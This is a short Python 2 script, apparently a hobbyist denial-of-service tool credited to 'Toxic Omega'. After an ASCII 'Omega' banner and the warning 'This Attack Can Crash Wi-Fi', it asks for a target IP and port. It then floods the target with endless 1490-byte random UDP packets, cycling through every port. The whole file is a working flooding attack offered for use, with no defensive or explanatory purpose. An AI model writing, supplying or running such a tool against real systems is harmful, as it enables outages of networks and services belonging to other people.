import os
import sys
import os
import time
import socket
import random
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year
#by Toxic Omega

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
print("\033[32m            ____                             \033[32m")
print("\033[32m           / __ \                            \033[32m")
print("\033[32m          | |  | |_ __ ___   ___  __ _  __ _ \033[32m")
print("\033[32m          | |  | | '_ ` _ \ / _ \/ _` |/ _` |\033[32m")
print("\033[32m          | |__| | | | | | |  __/ (_| | (_| |\033[32m")
print("\033[32m           \____/|_| |_| |_|\___|\__, |\__,_|\033[32m")
print("\033[32m                                  __/ |      \033[32m")
print("\033[32m                                 |___/       \033[32m")
print(" ")
print("         Warning: This Attack Can Crash Wi-Fi")
print(" ")
print("         Developer: Toxic Omega\033[31m")
print(" ")
print("\033[31m ")
ip = raw_input("          [*] Ip: ")
port = input("          [*] Port: ")

os.system("clear")
time.sleep(5)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "|Packets: %s |Ip: %s | port: %s |"%(sent,ip,port)
     if port == 65534:
       port = 1
